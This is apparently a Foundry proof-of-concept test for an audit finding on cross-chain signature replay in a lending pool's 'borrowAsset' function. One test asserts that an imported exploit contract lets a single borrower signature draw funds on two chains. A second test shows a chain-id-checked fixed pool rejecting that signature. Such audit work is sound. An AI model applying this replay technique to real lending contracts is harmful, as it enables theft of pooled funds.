// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Asset, BorrowPoolFixed} from
    "./48929-h-01-cross-chain-replay-in-borrowasset-swaptoborrow-kann-aud.sol";

contract Finding48929Test is Test {
    function test_exploit_one_signature_draws_both_chains() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.borrowToken().balanceOf(e.BORROWER()), 2_000 ether, "borrower received 2000");
        assertEq(e.chainA().drawn(), 1_000 ether, "chain A");
        assertEq(e.chainB().drawn(), 1_000 ether, "chain B");
        assertEq(e.collateral().balanceOf(address(e.chainA())), 1_500 ether, "A collateral");
        assertEq(e.collateral().balanceOf(address(e.chainB())), 1_500 ether, "B collateral");
    }

    function test_control_chainid_rejects_the_same_signature() public {
        Exploit e = new Exploit();
        Asset collateral = new Asset("COLL");
        Asset borrowToken = new Asset("USDC");
        BorrowPoolFixed fixedPool = new BorrowPoolFixed(collateral, borrowToken, e.BORROWER());
        collateral.mint(address(this), 1_500 ether);
        borrowToken.mint(address(fixedPool), 1_000 ether);
        collateral.approve(address(fixedPool), 1_500 ether);

        bytes32 r = e.SIG_R();
        bytes32 s = e.SIG_S();
        uint8 v = e.SIG_V();
        vm.expectRevert(bytes("signer"));
        fixedPool.borrowAsset(1, 1, 1_500 ether, 1_000 ether, r, s, v);

        assertEq(borrowToken.balanceOf(address(fixedPool)), 1_000 ether, "fixed pool kept the funds");
        assertEq(borrowToken.balanceOf(e.BORROWER()), 0, "borrower got nothing");
    }
}
